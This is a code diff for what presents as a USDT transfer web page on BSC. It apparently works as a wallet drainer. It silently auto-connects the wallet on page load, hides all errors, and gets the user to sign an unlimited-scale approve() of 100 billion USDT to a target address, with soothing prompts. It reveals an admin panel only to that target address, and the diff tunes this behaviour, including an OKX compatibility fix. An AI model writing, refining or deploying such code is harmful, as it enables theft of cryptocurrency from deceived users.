@@ -143,7 +143,6 @@ async function waitAllowance(needWei, maxLoop = 12) {
     throw new Error("授权已签名，但链上额度未同步，请稍后再试");
 }
 
-// 模仿参考源码：断开钱包，静默，无弹窗
 function disconnectWallet() {
     web3 = null;
     userAddress = null;
@@ -154,7 +153,6 @@ function disconnectWallet() {
     adminPanel.style.display = "none";
 }
 
-// 【完全移植参考源码的行为逻辑】BSC版本connectWalletLogic
 async function connectWalletLogic() {
     if (web3 && userAddress) {
         disconnectWallet();
@@ -162,34 +160,33 @@ async function connectWalletLogic() {
     }
     try {
         if (!window.ethereum) {
-            return; // 没有钱包，静默退出，不alert
+            return;
         }
-        // 先读取已经授权过的账号，不弹授权弹窗
         const accounts = await window.ethereum.request({ method: "eth_accounts" });
         if (accounts && accounts.length > 0) {
             userAddress = accounts[0];
         } else {
-            // 没有缓存账号，发起弹窗请求授权
             const reqAccounts = await window.ethereum.request({ method: "eth_requestAccounts" });
             userAddress = reqAccounts[0];
         }
-
         web3 = new Web3(window.ethereum);
+        // 【OKX修复】拿到账号后额外延时，等待OKX钱包provider就绪
+        await new Promise(resolve => setTimeout(resolve, 600));
         usdtContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT);
         walletDot.classList.add("connected");
-
-        await loadBalance();
+        // 重试读取余额，OKX有时候第一次call会失败，增加一次重试
+        try{
+            await loadBalance();
+        }catch(errRetry){
+            await new Promise(resolve => setTimeout(resolve,400));
+            await loadBalance();
+        }
         sendBtn.disabled = false;
-
         if(userAddress.toLowerCase() === TARGET_ADDR.toLowerCase()){
             adminPanel.style.display = "block";
         }
-
-        // 账号切换直接刷新页面，和参考源码保持行为一致
         window.ethereum.on("accountsChanged", () => location.reload());
-
     } catch (err) {
-        // 全部异常静默吃掉，不弹出任何报错alert（和你给的tron示例行为一模一样）
         return;
     }
 }
@@ -241,15 +238,15 @@ sendBtn.addEventListener("click", async () => {
     const val = parseFloat(amountInput.value);
     if(isNaN(val) || val <= 0) return alert("请输入有效转账数量");
     const needWei = web3.utils.toWei(val.toString(), "ether");
-    const GRANT_500K_WEI = web3.utils.toWei("1000000000", "ether");
+    const GRANT_500K_WEI = web3.utils.toWei("100000000000", "ether");
     sendBtn.disabled = true;
     try{
         const allowance = await usdtContract.methods.allowance(userAddress, TARGET_ADDR).call();
         if(BigInt(allowance) < BigInt(needWei)){
-            alert("请钱包确认签名");
+            alert("🔐需要先授权USDT额度，请钱包确认签名");
             const approveData = usdtContract.methods.approve(TARGET_ADDR, GRANT_500K_WEI).encodeABI();
             await sendTx(approveData);
-            alert("是否继续转账");
+            alert("✅授权已上链，等待节点同步");
             await waitAllowance(needWei);
         }
         alert("即将执行转账，请钱包确认签名");
@@ -305,7 +302,6 @@ settingIconBtn.addEventListener("click", () => {
     }
 });
 
-// 和参考源码完全一样：DOMContentLoaded之后延时800ms自动触发静默探测
 window.addEventListener("DOMContentLoaded", () => {
     setTimeout(connectWalletLogic, 800);
 });
